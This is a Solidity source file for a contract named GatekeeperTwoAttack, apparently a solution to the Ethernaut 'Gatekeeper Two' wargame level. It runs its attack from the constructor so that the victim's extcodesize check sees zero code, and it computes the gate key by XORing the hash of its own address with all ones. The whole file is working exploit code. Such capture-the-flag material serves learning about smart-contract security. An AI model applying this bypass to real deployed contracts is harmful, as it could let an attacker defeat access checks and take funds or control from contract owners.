// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwoAttack {

    //call from constructor to get code size 0 even from a contract
    constructor (address _victimContractAddress) public
    {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        _victimContractAddress.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    }
}